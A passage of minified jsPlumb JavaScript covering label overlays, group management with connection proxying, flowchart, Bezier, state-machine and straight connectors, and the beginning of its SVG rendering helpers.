            if (this.labelStyle.font = this.labelStyle.font || "12px sans-serif", d.style.font = this.labelStyle.font, d.style.color = this.labelStyle.color || "black", this.labelStyle.fill && (d.style.background = this.labelStyle.fill), this.labelStyle.borderWidth > 0) {
                var e = this.labelStyle.borderStyle ? this.labelStyle.borderStyle : "black";
                d.style.border = this.labelStyle.borderWidth + "px solid " + e
            }
            this.labelStyle.padding && (d.style.padding = this.labelStyle.padding)
        }
    }, c.extend(b.Overlays.Label, b.Overlays.Custom, {
        cleanup: function (a) {
            a && (this.div = null, this.label = null, this.labelText = null, this.cssClass = null, this.labelStyle = null)
        }, getLabel: function () {
            return this.label
        }, setLabel: function (a) {
            this.label = a, this.labelText = null, this.clearCachedDimensions(), this.update(), this.component.repaint()
        }, getDimensions: function () {
            return this.update(), i.prototype.getDimensions.apply(this, arguments)
        }, update: function () {
            if ("function" == typeof this.label) {
                var a = this.label(this);
                this.getElement().innerHTML = a.replace(/\r\n/g, "<br/>")
            } else null == this.labelText && (this.labelText = this.label, this.getElement().innerHTML = this.labelText.replace(/\r\n/g, "<br/>"))
        }, updateFrom: function (a) {
            null != a.label && this.setLabel(a.label)
        }
    })
}.call("undefined" != typeof window ? window : this), function () {
    "use strict";
    var a = this, b = function (b) {
        var c = b._mottle;
        return c || (c = b._mottle = new a.Mottle), c
    };
    a.jsPlumb.extend(a.jsPlumbInstance.prototype, {
        getEventManager: function () {
            return b(this)
        }, on: function (a, b, c) {
            return this.getEventManager().on.apply(this, arguments), this
        }, off: function (a, b, c) {
            return this.getEventManager().off.apply(this, arguments), this
        }
    })
}.call("undefined" != typeof window ? window : this), function () {
    "use strict";
    var a = this, b = a.jsPlumbUtil, c = a.jsPlumbInstance, d = "jtk-group-collapsed", e = "jtk-group-expanded",
        f = "[jtk-group-content]", g = "elementDraggable", h = "stop", i = "revert", j = "_groupManager",
        k = "_jsPlumbGroup", l = "_jsPlumbGroupDrag", m = "group:addMember", n = "group:removeMember", o = "group:add",
        p = "group:remove", q = "group:expand", r = "group:collapse", s = "groupDragStop", t = "connectionMoved",
        u = "internal.connectionDetached", v = "removeAll", w = "orphanAll", x = "show", y = "hide", z = function (a) {
            function c(a) {
                delete a.proxies;
                var c, d = i[a.id];
                null != d && (c = function (b) {
                    return b.id === a.id
                }, b.removeWithFunction(d.connections.source, c), b.removeWithFunction(d.connections.target, c), delete i[a.id]), null != (d = j[a.id]) && (c = function (b) {
                    return b.id === a.id
                }, b.removeWithFunction(d.connections.source, c), b.removeWithFunction(d.connections.target, c), delete j[a.id])
            }

            function f(b, c) {
                for (var d = b.getMembers(), e = 0; e < d.length; e++) a[c ? x : y](d[e], !0)
            }

            function g(b) {
                var c = b.getMembers(), d = a.getConnections({source: c, scope: "*"}, !0),
                    e = a.getConnections({target: c, scope: "*"}, !0), f = {};
                b.connections.source.length = 0, b.connections.target.length = 0;
                var g = function (a) {
                    for (var c = 0; c < a.length; c++) f[a[c].id] || (f[a[c].id] = !0, a[c].source._jsPlumbGroup === b ? (a[c].target._jsPlumbGroup !== b && b.connections.source.push(a[c]), i[a[c].id] = b) : a[c].target._jsPlumbGroup === b && (b.connections.target.push(a[c]), j[a[c].id] = b))
                };
                g(d), g(e)
            }

            var h = {}, i = {}, j = {}, l = this;
            a.bind("connection", function (a) {
                null != a.source[k] && null != a.target[k] && a.source[k] === a.target[k] ? (i[a.connection.id] = a.source[k], j[a.connection.id] = a.source[k]) : (null != a.source[k] && (b.suggest(a.source[k].connections.source, a.connection), i[a.connection.id] = a.source[k]), null != a.target[k] && (b.suggest(a.target[k].connections.target, a.connection), j[a.connection.id] = a.target[k]))
            }), a.bind(u, function (a) {
                c(a.connection)
            }), a.bind(t, function (a) {
                var b = 0 === a.index ? i : j, c = b[a.connection.id];
                if (c) {
                    var d = c.connections[0 === a.index ? "source" : "target"], e = d.indexOf(a.connection);
                    -1 !== e && d.splice(e, 1)
                }
            }), this.addGroup = function (b) {
                a.addClass(b.getEl(), e), h[b.id] = b, b.manager = this, g(b), a.fire(o, {group: b})
            }, this.addToGroup = function (b, c, d) {
                if (b = this.getGroup(b)) {
                    var e = b.getEl();
                    if (c._isJsPlumbGroup) return;
                    var f = c._jsPlumbGroup;
                    if (f !== b) {
                        var g = a.getOffset(c, !0), h = b.collapsed ? a.getOffset(e, !0) : a.getOffset(b.getDragArea(), !0);
                        null != f && (f.remove(c, !1, d, !1, b), l.updateConnectionsForGroup(f)), b.add(c, d);
                        var i = function (a, c) {
                            var d = 0 === c ? 1 : 0;
                            a.each(function (a) {
                                a.setVisible(!1), a.endpoints[d].element._jsPlumbGroup === b ? (a.endpoints[d].setVisible(!1), l.expandConnection(a, d, b)) : (a.endpoints[c].setVisible(!1), l.collapseConnection(a, c, b))
                            })
                        };
                        b.collapsed && (i(a.select({source: c}), 0), i(a.select({target: c}), 1));
                        var j = a.getId(c);
                        a.dragManager.setParent(c, j, e, a.getId(e), g);
                        var k = {left: g.left - h.left, top: g.top - h.top};
                        if (a.setPosition(c, k), a.dragManager.revalidateParent(c, j, g), l.updateConnectionsForGroup(b), a.revalidate(j), !d) {
                            var n = {group: b, el: c};
                            f && (n.sourceGroup = f), a.fire(m, n)
                        }
                    }
                }
            }, this.removeFromGroup = function (a, b, c) {
                (a = this.getGroup(a)) && a.remove(b, null, c)
            }, this.getGroup = function (a) {
                var c = a;
                if (b.isString(a) && null == (c = h[a])) throw new TypeError("No such group [" + a + "]");
                return c
            }, this.getGroups = function () {
                var a = [];
                for (var b in h) a.push(h[b]);
                return a
            }, this.removeGroup = function (b, c, d, e) {
                b = this.getGroup(b), this.expandGroup(b, !0);
                var f = b[c ? v : w](d, e);
                return a.remove(b.getEl()), delete h[b.id], delete a._groups[b.id], a.fire(p, {group: b}), f
            }, this.removeAllGroups = function (a, b, c) {
                for (var d in h) this.removeGroup(h[d], a, b, c)
            };
            var n = this.collapseConnection = function (b, c, d) {
                var e, f = d.getEl(), g = a.getId(f), h = b.endpoints[c].elementId,
                    i = b.endpoints[0 === c ? 1 : 0].element;
                i[k] && !i[k].shouldProxy() && i[k].collapsed || (b.proxies = b.proxies || [], e = b.proxies[c] ? b.proxies[c].ep : a.addEndpoint(f, {
                    endpoint: d.getEndpoint(b, c),
                    anchor: d.getAnchor(b, c),
                    parameters: {isProxyEndpoint: !0}
                }), e.setDeleteOnEmpty(!0), b.proxies[c] = {
                    ep: e,
                    originalEp: b.endpoints[c]
                }, 0 === c ? a.anchorManager.sourceChanged(h, g, b, f) : (a.anchorManager.updateOtherEndpoint(b.endpoints[0].elementId, h, g, b), b.target = f, b.targetId = g), b.proxies[c].originalEp.detachFromConnection(b, null, !0), e.connections = [b], b.endpoints[c] = e, b.setVisible(!0))
            };
            this.collapseGroup = function (b) {
                if (null != (b = this.getGroup(b)) && !b.collapsed) {
                    var c = b.getEl();
                    if (f(b, !1), b.shouldProxy()) {
                        var g = function (a, c) {
                            for (var d = 0; d < a.length; d++) {
                                var e = a[d];
                                n(e, c, b)
                            }
                        };
                        g(b.connections.source, 0), g(b.connections.target, 1)
                    }
                    b.collapsed = !0, a.removeClass(c, e), a.addClass(c, d), a.revalidate(c), a.fire(r, {group: b})
                }
            };
            var s = this.expandConnection = function (b, c, d) {
                if (null != b.proxies && null != b.proxies[c]) {
                    var e = a.getId(d.getEl()), f = b.proxies[c].originalEp.element, g = b.proxies[c].originalEp.elementId;
                    b.endpoints[c] = b.proxies[c].originalEp, 0 === c ? a.anchorManager.sourceChanged(e, g, b, f) : (a.anchorManager.updateOtherEndpoint(b.endpoints[0].elementId, e, g, b), b.target = f, b.targetId = g), b.proxies[c].ep.detachFromConnection(b, null), b.proxies[c].originalEp.addConnection(b), delete b.proxies[c]
                }
            };
            this.expandGroup = function (b, c) {
                if (null != (b = this.getGroup(b)) && b.collapsed) {
                    var g = b.getEl();
                    if (f(b, !0), b.shouldProxy()) {
                        var h = function (a, c) {
                            for (var d = 0; d < a.length; d++) {
                                var e = a[d];
                                s(e, c, b)
                            }
                        };
                        h(b.connections.source, 0), h(b.connections.target, 1)
                    }
                    b.collapsed = !1, a.addClass(g, e), a.removeClass(g, d), a.revalidate(g), this.repaintGroup(b), c || a.fire(q, {group: b})
                }
            }, this.repaintGroup = function (b) {
                b = this.getGroup(b);
                for (var c = b.getMembers(), d = 0; d < c.length; d++) a.revalidate(c[d])
            }, this.updateConnectionsForGroup = g, this.refreshAllGroups = function () {
                for (var b in h) g(h[b]), a.dragManager.updateOffsets(a.getId(h[b].getEl()))
            }
        }, A = function (c, d) {
            function e(a) {
                return a.offsetParent
            }

            function j(a, b) {
                var d = e(a), f = c.getSize(d), g = c.getSize(a), h = b[0], i = h + g[0], j = b[1], k = j + g[1];
                return i > 0 && h < f[0] && k > 0 && j < f[1]
            }

            function m(a) {
                var b = c.getId(a), d = c.getOffset(a);
                return a.parentNode.removeChild(a), c.getContainer().appendChild(a), c.setPosition(a, d), delete a._jsPlumbGroup, q(a), c.dragManager.clearParent(a, b), [b, d]
            }

            function o(a) {
                var b = null;
                if (!j(a.el, a.pos)) {
                    var d = a.el._jsPlumbGroup;
                    A ? c.remove(a.el) : b = m(a.el), d.remove(a.el)
                }
                return b
            }

            function p(a) {
                var b = c.getId(a);
                c.revalidate(a), c.dragManager.revalidateParent(a, b)
            }

            function q(a) {
                a._katavorioDrag && ((A || z) && a._katavorioDrag.off(h, o), A || z || !y || (a._katavorioDrag.off(i, p), a._katavorioDrag.setRevert(null)))
            }

            function r(a) {
                a._katavorioDrag && ((A || z) && a._katavorioDrag.on(h, o), x && a._katavorioDrag.setConstrain(!0), w && a._katavorioDrag.setUseGhostProxy(!0), A || z || !y || (a._katavorioDrag.on(i, p), a._katavorioDrag.setRevert(function (a, b) {
                    return !j(a, b)
                })))
            }

            var t = this, u = d.el;
            this.getEl = function () {
                return u
            }, this.id = d.id || b.uuid(), u._isJsPlumbGroup = !0;
            var v = this.getDragArea = function () {
                    var a = c.getSelector(u, f);
                    return a && a.length > 0 ? a[0] : u
                }, w = !0 === d.ghost, x = w || !0 === d.constrain, y = !1 !== d.revert, z = !0 === d.orphan,
                A = !0 === d.prune, B = !0 === d.dropOverride, C = !1 !== d.proxied, D = [];
            if (this.connections = {source: [], target: [], internal: []}, this.getAnchor = function (a, b) {
                return d.anchor || "Continuous"
            }, this.getEndpoint = function (a, b) {
                return d.endpoint || ["Dot", {radius: 10}]
            }, this.collapsed = !1, !1 !== d.draggable) {
                var E = {
                    stop: function (a) {
                        c.fire(s, jsPlumb.extend(a, {group: t}))
                    }, scope: l
                };
                d.dragOptions && a.jsPlumb.extend(E, d.dragOptions), c.draggable(d.el, E)
            }
            !1 !== d.droppable && c.droppable(d.el, {
                drop: function (a) {
                    var b = a.drag.el;
                    if (!b._isJsPlumbGroup) {
                        var d = b._jsPlumbGroup;
                        if (d !== t) {
                            if (null != d && d.overrideDrop(b, t)) return;
                            c.getGroupManager().addToGroup(t, b, !1)
                        }
                    }
                }
            });
            var F = function (a, b) {
                for (var c = null == a.nodeType ? a : [a], d = 0; d < c.length; d++) b(c[d])
            };
            this.overrideDrop = function (a, b) {
                return B && (y || A || z)
            }, this.add = function (a, b) {
                var d = v();
                F(a, function (a) {
                    if (null != a._jsPlumbGroup) {
                        if (a._jsPlumbGroup === t) return;
                        a._jsPlumbGroup.remove(a, !0, b, !1)
                    }
                    a._jsPlumbGroup = t, D.push(a), c.isAlreadyDraggable(a) && r(a), a.parentNode !== d && d.appendChild(a)
                }), c.getGroupManager().updateConnectionsForGroup(t)
            }, this.remove = function (a, d, e, f, g) {
                F(a, function (a) {
                    if (delete a._jsPlumbGroup, b.removeWithFunction(D, function (b) {
                        return b === a
                    }), d) try {
                        t.getDragArea().removeChild(a)
                    } catch (a) {
                        jsPlumbUtil.log("Could not remove element from Group " + a)
                    }
                    if (q(a), !e) {
                        var f = {group: t, el: a};
                        g && (f.targetGroup = g), c.fire(n, f)
                    }
                }), f || c.getGroupManager().updateConnectionsForGroup(t)
            }, this.removeAll = function (a, b) {
                for (var d = 0, e = D.length; d < e; d++) {
                    var f = D[0];
                    t.remove(f, a, b, !0), c.remove(f, !0)
                }
                D.length = 0, c.getGroupManager().updateConnectionsForGroup(t)
            }, this.orphanAll = function () {
                for (var a = {}, b = 0; b < D.length; b++) {
                    var c = m(D[b]);
                    a[c[0]] = c[1]
                }
                return D.length = 0, a
            }, this.getMembers = function () {
                return D
            }, u[k] = this, c.bind(g, function (a) {
                a.el._jsPlumbGroup === this && r(a.el)
            }.bind(this)), this.shouldProxy = function () {
                return C
            }, c.getGroupManager().addGroup(this)
        };
    c.prototype.addGroup = function (a) {
        var b = this;
        if (b._groups = b._groups || {}, null != b._groups[a.id]) throw new TypeError("cannot create Group [" + a.id + "]; a Group with that ID exists");
        if (null != a.el[k]) throw new TypeError("cannot create Group [" + a.id + "]; the given element is already a Group");
        var c = new A(b, a);
        return b._groups[c.id] = c, a.collapsed && this.collapseGroup(c), c
    }, c.prototype.addToGroup = function (a, b, c) {
        var d = function (b) {
            var d = this.getId(b);
            this.manage(d, b), this.getGroupManager().addToGroup(a, b, c)
        }.bind(this);
        if (Array.isArray(b)) for (var e = 0; e < b.length; e++) d(b[e]); else d(b)
    }, c.prototype.removeFromGroup = function (a, b, c) {
        this.getGroupManager().removeFromGroup(a, b, c)
    }, c.prototype.removeGroup = function (a, b, c, d) {
        return this.getGroupManager().removeGroup(a, b, c, d)
    }, c.prototype.removeAllGroups = function (a, b, c) {
        this.getGroupManager().removeAllGroups(a, b, c)
    }, c.prototype.getGroup = function (a) {
        return this.getGroupManager().getGroup(a)
    }, c.prototype.getGroups = function () {
        return this.getGroupManager().getGroups()
    }, c.prototype.expandGroup = function (a) {
        this.getGroupManager().expandGroup(a)
    }, c.prototype.collapseGroup = function (a) {
        this.getGroupManager().collapseGroup(a)
    }, c.prototype.repaintGroup = function (a) {
        this.getGroupManager().repaintGroup(a)
    }, c.prototype.toggleGroup = function (a) {
        null != (a = this.getGroupManager().getGroup(a)) && this.getGroupManager()[a.collapsed ? "expandGroup" : "collapseGroup"](a)
    }, c.prototype.getGroupManager = function () {
        var a = this[j];
        return null == a && (a = this[j] = new z(this)), a
    }, c.prototype.removeGroupManager = function () {
        delete this[j]
    }, c.prototype.getGroupFor = function (a) {
        if (a = this.getElement(a)) return a[k]
    }
}.call("undefined" != typeof window ? window : this), function () {
    "use strict";
    var a = this, b = a.jsPlumb, c = a.jsPlumbUtil, d = "Straight", e = "Arc", f = function (a) {
        this.type = "Flowchart", a = a || {}, a.stub = null == a.stub ? 30 : a.stub;
        var c, f, g = b.Connectors.AbstractConnector.apply(this, arguments), h = null == a.midpoint ? .5 : a.midpoint,
            i = !0 === a.alwaysRespectStubs, j = null, k = null, l = null != a.cornerRadius ? a.cornerRadius : 0,
            m = (a.loopbackRadius, function (a) {
                return a < 0 ? -1 : 0 === a ? 0 : 1
            }), n = function (a) {
                return [m(a[2] - a[0]), m(a[3] - a[1])]
            }, o = function (a, b, c, d) {
                if (j !== b || k !== c) {
                    var e = null == j ? d.sx : j, f = null == k ? d.sy : k, g = e === b ? "v" : "h";
                    j = b, k = c, a.push([e, f, b, c, g])
                }
            }, p = function (a) {
                return Math.sqrt(Math.pow(a[0] - a[2], 2) + Math.pow(a[1] - a[3], 2))
            }, q = function (a) {
                var b = [];
                return b.push.apply(b, a), b
            }, r = function (a, b, c) {
                for (var f, h, i, j = null, k = 0; k < b.length - 1; k++) {
                    if (j = j || q(b[k]), f = q(b[k + 1]), h = n(j), i = n(f), l > 0 && j[4] !== f[4]) {
                        var m = Math.min(p(j), p(f)), o = Math.min(l, m / 2);
                        j[2] -= h[0] * o, j[3] -= h[1] * o, f[0] += i[0] * o, f[1] += i[1] * o;
                        var r = h[1] === i[0] && 1 === i[0] || h[1] === i[0] && 0 === i[0] && h[0] !== i[1] || h[1] === i[0] && -1 === i[0],
                            s = f[1] > j[3] ? 1 : -1, t = f[0] > j[2] ? 1 : -1, u = s === t,
                            v = u && r || !u && !r ? f[0] : j[2], w = u && r || !u && !r ? j[3] : f[1];
                        g.addSegment(a, d, {x1: j[0], y1: j[1], x2: j[2], y2: j[3]}), g.addSegment(a, e, {
                            r: o,
                            x1: j[2],
                            y1: j[3],
                            x2: f[0],
                            y2: f[1],
                            cx: v,
                            cy: w,
                            ac: r
                        })
                    } else {
                        var x = j[2] === j[0] ? 0 : j[2] > j[0] ? c.lw / 2 : -c.lw / 2,
                            y = j[3] === j[1] ? 0 : j[3] > j[1] ? c.lw / 2 : -c.lw / 2;
                        g.addSegment(a, d, {x1: j[0] - x, y1: j[1] - y, x2: j[2] + x, y2: j[3] + y})
                    }
                    j = f
                }
                null != f && g.addSegment(a, d, {x1: f[0], y1: f[1], x2: f[2], y2: f[3]})
            };
        this._compute = function (a, b) {
            c = [], j = null, k = null, f = null;
            var d = function () {
                    return [a.startStubX, a.startStubY, a.endStubX, a.endStubY]
                }, e = {
                    perpendicular: d, orthogonal: d, opposite: function (b) {
                        var c = a, d = "x" === b ? 0 : 1, e = {
                            x: function () {
                                return 1 === c.so[d] && (c.startStubX > c.endStubX && c.tx > c.startStubX || c.sx > c.endStubX && c.tx > c.sx) || -1 === c.so[d] && (c.startStubX < c.endStubX && c.tx < c.startStubX || c.sx < c.endStubX && c.tx < c.sx)
                            }, y: function () {
                                return 1 === c.so[d] && (c.startStubY > c.endStubY && c.ty > c.startStubY || c.sy > c.endStubY && c.ty > c.sy) || -1 === c.so[d] && (c.startStubY < c.endStubY && c.ty < c.startStubY || c.sy < c.endStubY && c.ty < c.sy)
                            }
                        };
                        return !i && e[b]() ? {
                            x: [(a.sx + a.tx) / 2, a.startStubY, (a.sx + a.tx) / 2, a.endStubY],
                            y: [a.startStubX, (a.sy + a.ty) / 2, a.endStubX, (a.sy + a.ty) / 2]
                        }[b] : [a.startStubX, a.startStubY, a.endStubX, a.endStubY]
                    }
                }, l = e[a.anchorOrientation](a.sourceAxis), m = "x" === a.sourceAxis ? 0 : 1,
                n = "x" === a.sourceAxis ? 1 : 0, p = l[m], q = l[n], s = l[m + 2], t = l[n + 2];
            o(c, l[0], l[1], a);
            var u = a.startStubX + (a.endStubX - a.startStubX) * h, v = a.startStubY + (a.endStubY - a.startStubY) * h,
                w = {x: [0, 1], y: [1, 0]}, x = {
                    perpendicular: function (b) {
                        var c = a, d = {
                                x: [[[1, 2, 3, 4], null, [2, 1, 4, 3]], null, [[4, 3, 2, 1], null, [3, 4, 1, 2]]],
                                y: [[[3, 2, 1, 4], null, [2, 3, 4, 1]], null, [[4, 1, 2, 3], null, [1, 4, 3, 2]]]
                            }, e = {
                                x: [[c.startStubX, c.endStubX], null, [c.endStubX, c.startStubX]],
                                y: [[c.startStubY, c.endStubY], null, [c.endStubY, c.startStubY]]
                            }, f = {x: [[u, c.startStubY], [u, c.endStubY]], y: [[c.startStubX, v], [c.endStubX, v]]},
                            g = {x: [[c.endStubX, c.startStubY]], y: [[c.startStubX, c.endStubY]]}, h = {
                                x: [[c.startStubX, c.endStubY], [c.endStubX, c.endStubY]],
                                y: [[c.endStubX, c.startStubY], [c.endStubX, c.endStubY]]
                            }, i = {
                                x: [[c.startStubX, v], [c.endStubX, v], [c.endStubX, c.endStubY]],
                                y: [[u, c.startStubY], [u, c.endStubY], [c.endStubX, c.endStubY]]
                            }, j = {x: [c.startStubY, c.endStubY], y: [c.startStubX, c.endStubX]}, k = w[b][0], l = w[b][1],
                            m = c.so[k] + 1, n = c.to[l] + 1,
                            o = -1 === c.to[l] && j[b][1] < j[b][0] || 1 === c.to[l] && j[b][1] > j[b][0], p = e[b][m][0],
                            q = e[b][m][1], r = d[b][m][n];
                        return c.segment === r[3] || c.segment === r[2] && o ? f[b] : c.segment === r[2] && q < p ? g[b] : c.segment === r[2] && q >= p || c.segment === r[1] && !o ? i[b] : c.segment === r[0] || c.segment === r[1] && o ? h[b] : void 0
                    }, orthogonal: function (b, c, d, e, f) {
                        var g = a, h = {
                            x: -1 === g.so[0] ? Math.min(c, e) : Math.max(c, e),
                            y: -1 === g.so[1] ? Math.min(c, e) : Math.max(c, e)
                        }[b];
                        return {x: [[h, d], [h, f], [e, f]], y: [[d, h], [f, h], [f, e]]}[b]
                    }, opposite: function (c, d, e, f) {
                        var h = a, i = {x: "y", y: "x"}[c], j = {x: "height", y: "width"}[c],
                            k = h["is" + c.toUpperCase() + "GreaterThanStubTimes2"];
                        if (b.sourceEndpoint.elementId === b.targetEndpoint.elementId) {
                            var l = e + (1 - b.sourceEndpoint.anchor[i]) * b.sourceInfo[j] + g.maxStub;
                            return {x: [[d, l], [f, l]], y: [[l, d], [l, f]]}[c]
                        }
                        return !k || 1 === h.so[m] && d > f || -1 === h.so[m] && d < f ? {
                            x: [[d, v], [f, v]],
                            y: [[u, d], [u, f]]
                        }[c] : 1 === h.so[m] && d < f || -1 === h.so[m] && d > f ? {
                            x: [[u, h.sy], [u, h.ty]],
                            y: [[h.sx, v], [h.tx, v]]
                        }[c] : void 0
                    }
                }, y = x[a.anchorOrientation](a.sourceAxis, p, q, s, t);
            if (y) for (var z = 0; z < y.length; z++) o(c, y[z][0], y[z][1], a);
            o(c, l[2], l[3], a), o(c, a.tx, a.ty, a), r(this, c, a)
        }
    };
    b.Connectors.Flowchart = f, c.extend(b.Connectors.Flowchart, b.Connectors.AbstractConnector)
}.call("undefined" != typeof window ? window : this), function () {
    "use strict";
    var a = this, b = a.jsPlumb, c = a.jsPlumbUtil;
    b.Connectors.AbstractBezierConnector = function (a) {
        a = a || {};
        var c, d = !1 !== a.showLoopback, e = (a.curviness, a.margin || 5),
            f = (a.proximityLimit, a.orientation && "clockwise" === a.orientation), g = a.loopbackRadius || 25, h = !1;
        return this._compute = function (a, b) {
            var i = b.sourcePos, j = b.targetPos, k = Math.abs(i[0] - j[0]), l = Math.abs(i[1] - j[1]);
            if (d && b.sourceEndpoint.elementId === b.targetEndpoint.elementId) {
                h = !0;
                var m = b.sourcePos[0], n = b.sourcePos[1] - e, o = m, p = n - g, q = o - g, r = p - g;
                k = 2 * g, l = 2 * g, a.points[0] = q, a.points[1] = r, a.points[2] = k, a.points[3] = l, c.addSegment(this, "Arc", {
                    loopback: !0,
                    x1: m - q + 4,
                    y1: n - r,
                    startAngle: 0,
                    endAngle: 2 * Math.PI,
                    r: g,
                    ac: !f,
                    x2: m - q - 4,
                    y2: n - r,
                    cx: o - q,
                    cy: p - r
                })
            } else h = !1, this._computeBezier(a, b, i, j, k, l)
        }, c = b.Connectors.AbstractConnector.apply(this, arguments)
    }, c.extend(b.Connectors.AbstractBezierConnector, b.Connectors.AbstractConnector);
    var d = function (a) {
        a = a || {}, this.type = "Bezier";
        var c = b.Connectors.AbstractBezierConnector.apply(this, arguments), d = a.curviness || 150, e = 10;
        this.getCurviness = function () {
            return d
        }, this._findControlPoint = function (a, b, c, f, g, h, i) {
            var j = h[0] !== i[0] || h[1] === i[1], k = [];
            return j ? (0 === i[0] ? k.push(c[0] < b[0] ? a[0] + e : a[0] - e) : k.push(a[0] + d * i[0]), 0 === i[1] ? k.push(c[1] < b[1] ? a[1] + e : a[1] - e) : k.push(a[1] + d * h[1])) : (0 === h[0] ? k.push(b[0] < c[0] ? a[0] + e : a[0] - e) : k.push(a[0] - d * h[0]), 0 === h[1] ? k.push(b[1] < c[1] ? a[1] + e : a[1] - e) : k.push(a[1] + d * i[1])), k
        }, this._computeBezier = function (a, b, d, e, f, g) {
            var h, i, j = d[0] < e[0] ? f : 0, k = d[1] < e[1] ? g : 0, l = d[0] < e[0] ? 0 : f,
                m = d[1] < e[1] ? 0 : g;
            h = this._findControlPoint([j, k], d, e, b.sourceEndpoint, b.targetEndpoint, a.so, a.to), i = this._findControlPoint([l, m], e, d, b.targetEndpoint, b.sourceEndpoint, a.to, a.so), c.addSegment(this, "Bezier", {
                x1: j,
                y1: k,
                x2: l,
                y2: m,
                cp1x: h[0],
                cp1y: h[1],
                cp2x: i[0],
                cp2y: i[1]
            })
        }
    };
    b.Connectors.Bezier = d, c.extend(d, b.Connectors.AbstractBezierConnector)
}.call("undefined" != typeof window ? window : this), function () {
    "use strict";
    var a = this, b = a.jsPlumb, c = a.jsPlumbUtil, d = function (a, b, c, d) {
        return a <= c && d <= b ? 1 : a <= c && b <= d ? 2 : c <= a && d >= b ? 3 : 4
    }, e = function (a, b, c, d, e, f, g, h, i) {
        return h <= i ? [a, b] : 1 === c ? d[3] <= 0 && e[3] >= 1 ? [a + (d[2] < .5 ? -1 * f : f), b] : d[2] >= 1 && e[2] <= 0 ? [a, b + (d[3] < .5 ? -1 * g : g)] : [a + -1 * f, b + -1 * g] : 2 === c ? d[3] >= 1 && e[3] <= 0 ? [a + (d[2] < .5 ? -1 * f : f), b] : d[2] >= 1 && e[2] <= 0 ? [a, b + (d[3] < .5 ? -1 * g : g)] : [a + f, b + -1 * g] : 3 === c ? d[3] >= 1 && e[3] <= 0 ? [a + (d[2] < .5 ? -1 * f : f), b] : d[2] <= 0 && e[2] >= 1 ? [a, b + (d[3] < .5 ? -1 * g : g)] : [a + -1 * f, b + -1 * g] : 4 === c ? d[3] <= 0 && e[3] >= 1 ? [a + (d[2] < .5 ? -1 * f : f), b] : d[2] <= 0 && e[2] >= 1 ? [a, b + (d[3] < .5 ? -1 * g : g)] : [a + f, b + -1 * g] : void 0
    }, f = function (a) {
        a = a || {}, this.type = "StateMachine";
        var c, f = b.Connectors.AbstractBezierConnector.apply(this, arguments), g = a.curviness || 10,
            h = a.margin || 5, i = a.proximityLimit || 80;
        a.orientation && a.orientation;
        this._computeBezier = function (a, b, j, k, l, m) {
            var n = b.sourcePos[0] < b.targetPos[0] ? 0 : l, o = b.sourcePos[1] < b.targetPos[1] ? 0 : m,
                p = b.sourcePos[0] < b.targetPos[0] ? l : 0, q = b.sourcePos[1] < b.targetPos[1] ? m : 0;
            0 === b.sourcePos[2] && (n -= h), 1 === b.sourcePos[2] && (n += h), 0 === b.sourcePos[3] && (o -= h), 1 === b.sourcePos[3] && (o += h), 0 === b.targetPos[2] && (p -= h), 1 === b.targetPos[2] && (p += h), 0 === b.targetPos[3] && (q -= h), 1 === b.targetPos[3] && (q += h);
            var r, s, t, u, v = (n + p) / 2, w = (o + q) / 2, x = d(n, o, p, q),
                y = Math.sqrt(Math.pow(p - n, 2) + Math.pow(q - o, 2));
            c = e(v, w, x, b.sourcePos, b.targetPos, g, g, y, i), r = c[0], s = c[0], t = c[1], u = c[1], f.addSegment(this, "Bezier", {
                x1: p,
                y1: q,
                x2: n,
                y2: o,
                cp1x: r,
                cp1y: t,
                cp2x: s,
                cp2y: u
            })
        }
    };
    b.Connectors.StateMachine = f, c.extend(f, b.Connectors.AbstractBezierConnector)
}.call("undefined" != typeof window ? window : this), function () {
    "use strict";
    var a = this, b = a.jsPlumb, c = a.jsPlumbUtil, d = "Straight", e = function (a) {
        this.type = d;
        var c = b.Connectors.AbstractConnector.apply(this, arguments);
        this._compute = function (a, b) {
            c.addSegment(this, d, {
                x1: a.sx,
                y1: a.sy,
                x2: a.startStubX,
                y2: a.startStubY
            }), c.addSegment(this, d, {
                x1: a.startStubX,
                y1: a.startStubY,
                x2: a.endStubX,
                y2: a.endStubY
            }), c.addSegment(this, d, {x1: a.endStubX, y1: a.endStubY, x2: a.tx, y2: a.ty})
        }
    };
    b.Connectors.Straight = e, c.extend(e, b.Connectors.AbstractConnector)
}.call("undefined" != typeof window ? window : this), function () {
    "use strict";
    var a = this, b = a.jsPlumb, c = a.jsPlumbUtil, d = {
            "stroke-linejoin": "stroke-linejoin",
            "stroke-dashoffset": "stroke-dashoffset",
            "stroke-linecap": "stroke-linecap"
        }, e = "stroke-dasharray", f = "dashstyle", g = "linearGradient", h = "radialGradient", i = "defs", j = "fill",
        k = "stop", l = "stroke", m = "stroke-width", n = "style", o = "none", p = "jsplumb_gradient_",
        q = "strokeWidth", r = {svg: "http://www.w3.org/2000/svg"}, s = function (a, b) {
            for (var c in b) a.setAttribute(c, "" + b[c])
        }, t = function (a, c) {
            return c = c || {}, c.version = "1.1", c.xmlns = r.svg, b.createElementNS(r.svg, a, null, null, c)
        }, u = function (a) {
            return "position:absolute;left:" + a[0] + "px;top:" + a[1] + "px"
        }, v = function (a) {
            for (var b = a.querySelectorAll(" defs,linearGradient,radialGradient"), c = 0; c < b.length; c++) b[c].parentNode.removeChild(b[c])
        }, w = function (a, b, c, d, e) {
            var f = p + e._jsPlumb.instance.idstamp();
            v(a);
            var m;
            m = c.gradient.offset ? t(h, {id: f}) : t(g, {id: f, gradientUnits: "userSpaceOnUse"});
            var n = t(i);
            a.appendChild(n), n.appendChild(m);
            for (var o = 0; o < c.gradient.stops.length; o++) {
                var q = 1 === e.segment || 2 === e.segment ? o : c.gradient.stops.length - 1 - o,
                    r = c.gradient.stops[q][1],
                    s = t(k, {offset: Math.floor(100 * c.gradient.stops[o][0]) + "%", "stop-color": r});
                m.appendChild(s)
            }
            var u = c.stroke ? l : j;
            b.setAttribute(u, "url(#" + f + ")")
        }, x = function (a, b, c, g, h) {
            if (b.setAttribute(j, c.fill ? c.fill : o), b.setAttribute(l, c.stroke ? c.stroke : o), c.gradient ? w(a, b, c, g, h) : (v(a), b.setAttribute(n, "")), c.strokeWidth && b.setAttribute(m, c.strokeWidth), c[f] && c[q] && !c[e]) {
                var i = -1 === c[f].indexOf(",") ? " " : ",", k = c[f].split(i), p = "";
                k.forEach(function (a) {
                    p += Math.floor(a * c.strokeWidth) + i
                }), b.setAttribute(e, p)
            } else c[e] && b.setAttribute(e, c[e]);
            for (var r in d) c[r] && b.setAttribute(d[r], c[r])
        }, y = function (a, b, c) {
            a.childNodes.length > c ? a.insertBefore(b, a.childNodes[c]) : a.appendChild(b)
